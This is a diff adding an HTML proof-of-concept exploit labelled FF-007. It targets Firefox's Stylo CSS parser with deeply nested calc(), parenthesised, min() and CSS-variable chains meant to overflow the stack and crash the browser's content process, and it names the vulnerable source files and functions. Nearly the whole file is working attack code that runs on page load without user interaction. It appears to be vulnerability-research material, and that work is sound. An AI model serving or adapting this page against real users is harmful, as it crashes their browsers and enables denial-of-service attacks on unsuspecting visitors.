@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<body>
+<pre id="output"></pre>
+<script>
+/*
+ * FF-007: CSS calc() Stack Overflow — Unbounded Recursion in Stylo Parser
+ *
+ * Target: Servo/Stylo CSS calc() parsing and resolution
+ * Files:
+ *   servo/components/style/values/specified/calc.rs:610 — parse_one()
+ *   servo/components/style/values/generics/calc.rs:928 — resolve_internal()
+ *
+ * The calc() parser recursively descends into nested calc() functions
+ * and parenthesized expressions without any depth limit. The resolution
+ * code (resolve_internal) is also recursive with no depth counter.
+ *
+ * Crafted CSS with deeply nested calc() expressions will exhaust the
+ * stack during either parsing or value resolution, crashing the content
+ * process (or the main process in single-process mode).
+ *
+ * No user interaction required — the CSS is applied automatically.
+ */
+
+function log(msg) {
+    document.getElementById('output').textContent += msg + '\n';
+    console.log(msg);
+}
+
+log('[*] FF-007: CSS calc() Stack Overflow PoC');
+log('[*] Generating deeply nested calc() expressions...');
+
+// Strategy 1: Deeply nested calc() functions
+// calc(calc(calc(calc(... calc(1px) ...))))
+// Each nesting level pushes a new stack frame in parse_one() → parse_argument()
+function makeNestedCalc(depth) {
+    let open = '';
+    let close = '';
+    for (let i = 0; i < depth; i++) {
+        open += 'calc(';
+        close += ')';
+    }
+    return open + '1px' + close;
+}
+
+// Strategy 2: Deeply nested parenthesized expressions inside calc()
+// calc((((((... (1px) ...)))))
+// Each paren pushes via parse_nested_block → parse_argument
+function makeNestedParens(depth) {
+    let open = 'calc(';
+    let close = ')';
+    for (let i = 0; i < depth; i++) {
+        open += '(';
+        close += ')';
+    }
+    return open + '1px' + close;
+}
+
+// Strategy 3: Nested min/max/clamp — each level recurses in resolve_internal
+// calc(min(min(min(... min(1px, 2px) ..., 2px), 2px), 2px)
+function makeNestedMinMax(depth) {
+    let expr = '1px';
+    for (let i = 0; i < depth; i++) {
+        expr = 'min(' + expr + ', 2px)';
+    }
+    return 'calc(' + expr + ')';
+}
+
+// Strategy 4: CSS variables with long dependency chains (no cycles)
+// The variable resolution traverses the dependency graph recursively
+function makeVarChain(depth) {
+    let rules = '';
+    for (let i = 0; i < depth; i++) {
+        rules += '--v' + i + ': calc(var(--v' + (i + 1) + ') + 1px); ';
+    }
+    rules += '--v' + depth + ': 1px;';
+    return rules;
+}
+
+// Attempt 1: Nested calc() functions
+let depths = [500, 1000, 2000, 5000, 10000];
+let testDiv = document.createElement('div');
+document.body.appendChild(testDiv);
+
+for (let depth of depths) {
+    log('[*] Attempting nested calc() with depth=' + depth);
+    try {
+        let expr = makeNestedCalc(depth);
+        testDiv.style.width = expr;
+        let computed = getComputedStyle(testDiv).width;
+        log('[*]   Computed width: ' + computed);
+        if (computed === '' || computed === 'auto') {
+            log('[!]   Parser may have failed or bailed — possible stack issue');
+        }
+    } catch (e) {
+        log('[!]   Exception: ' + e);
+    }
+    testDiv.style.width = '';
+}
+
+// Attempt 2: Nested parentheses
+log('\n[*] Attempting nested parentheses in calc()...');
+for (let depth of depths) {
+    log('[*] Attempting nested parens with depth=' + depth);
+    try {
+        let expr = makeNestedParens(depth);
+        testDiv.style.width = expr;
+        let computed = getComputedStyle(testDiv).width;
+        log('[*]   Computed width: ' + computed);
+    } catch (e) {
+        log('[!]   Exception: ' + e);
+    }
+    testDiv.style.width = '';
+}
+
+// Attempt 3: Nested min/max
+log('\n[*] Attempting nested min/max...');
+for (let depth of [100, 500, 1000, 2000]) {
+    log('[*] Attempting nested min() with depth=' + depth);
+    try {
+        let expr = makeNestedMinMax(depth);
+        testDiv.style.width = expr;
+        let computed = getComputedStyle(testDiv).width;
+        log('[*]   Computed width: ' + computed);
+    } catch (e) {
+        log('[!]   Exception: ' + e);
+    }
+    testDiv.style.width = '';
+}
+
+// Attempt 4: CSS variable chains
+log('\n[*] Attempting CSS variable dependency chains...');
+for (let depth of [100, 500, 1000, 2000]) {
+    log('[*] Attempting var chain with depth=' + depth);
+    try {
+        let style = document.createElement('style');
+        let varRules = makeVarChain(depth);
+        style.textContent = '#target-' + depth + ' { ' + varRules +
+            ' width: var(--v0); }';
+        document.head.appendChild(style);
+
+        let target = document.createElement('div');
+        target.id = 'target-' + depth;
+        target.style.display = 'block';
+        document.body.appendChild(target);
+
+        let computed = getComputedStyle(target).width;
+        log('[*]   Computed width: ' + computed);
+        if (computed === '' || computed === 'auto') {
+            log('[!]   Variable resolution may have hit stack limit');
+        }
+
+        document.head.removeChild(style);
+        document.body.removeChild(target);
+    } catch (e) {
+        log('[!]   Exception: ' + e);
+    }
+}
+
+// Attempt 5: Inject via stylesheet for maximum impact
+// This approach uses @import or inline style to ensure the parser
+// processes the deeply nested expression in the style system thread
+log('\n[*] Attempting stylesheet injection for parsing-phase crash...');
+try {
+    let style = document.createElement('style');
+    let megaExpr = makeNestedCalc(10000);
+    style.textContent = 'div { width: ' + megaExpr + '; }';
+    document.head.appendChild(style);
+    // Force style computation
+    let d = document.createElement('div');
+    document.body.appendChild(d);
+    void getComputedStyle(d).width;
+    log('[*] Style computed without crash (parser may cap nesting)');
+} catch(e) {
+    log('[!] Exception during stylesheet processing: ' + e);
+}
+
+log('\n[*] PoC complete.');
+log('[*] If Firefox crashed during any of these tests, the stack overflow');
+log('[*] was triggered. Check for ASan reports or crash dumps.');
+log('[*] The crash will be in:');
+log('[*]   - Parsing: servo::values::specified::calc::CalcNode::parse_one');
+log('[*]   - Resolution: servo::values::generics::calc::GenericCalcNode::resolve_internal');
+log('[*]   - Variables: servo::custom_properties::traverse');
+</script>
+</body>
+</html>
